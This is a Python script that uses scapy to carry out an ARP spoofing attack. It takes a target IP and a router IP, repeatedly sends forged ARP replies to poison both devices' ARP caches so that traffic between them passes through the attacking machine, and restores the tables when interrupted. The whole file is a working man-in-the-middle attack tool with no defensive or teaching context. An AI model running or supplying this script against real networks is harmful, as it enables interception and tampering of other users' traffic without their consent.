from scapy.all import *
import time
import sys
import optparse
from packet_craft import *
from misc import *

# getting arguments
parser = optparse.OptionParser()
parser.add_option('-i', dest='target_ip', help="enter the target device's IP address")
parser.add_option('-r', dest='router_ip', help="enter the router's IP address")
(options, arg) = parser.parse_args()

if not options.router_ip:
    log_error("please provide router's IP address")
    sys.exit()

if not options.target_ip:
    log_error("please provide target's IP address")
    sys.exit()

# getting the MAC address of the target computer
def get_mac(ip):
    arp_broadcast = arp_packet(pdst=ip)
    answer = srp(arp_broadcast, verbose=False)
    print( answer[0][0][1].hwsrc)
    return answer[0][0][1].hwsrc

# spoofing router and the target machine
def arp_spoof(target_ip, spoofed_ip):
    target_MAC = get_mac(target_ip)
    ARP_packet = arp_packet(psrc=spoofed_ip, pdst=target_ip, dst=target_MAC, op=2)
    send(ARP_packet, verbose=1)

# prepare a packet to restore the original ARP table once the attack is over
def restore_ARP(target_ip, spoofed_ip):
    target_MAC = get_mac(target_ip)
    router_MAC = get_mac(spoofed_ip)
    arp_restore_packet = arp_packet(src=router_MAC, dst=target_MAC, psrc=spoofed_ip, pdst=target_ip, op=2 )
    send(arp_restore_packet, verbose=1)

# trick the router and the target. When the attack is over - ctrl + c detected, restore ARP table

counter = 1
try:
    while True:
        # log_debug("got here 1")
        arp_spoof(options.target_ip, options.router_ip)
        arp_spoof(options.router_ip, options.target_ip)
        log_notice('packets sent' + str(counter))
        counter += 1
        time.sleep(1)
except KeyboardInterrupt:
    log_notice("\nrestoring target and router's ARP table and quitting")
    restore_ARP(options.target_ip, options.router_ip)
    restore_ARP(options.router_ip, options.target_ip)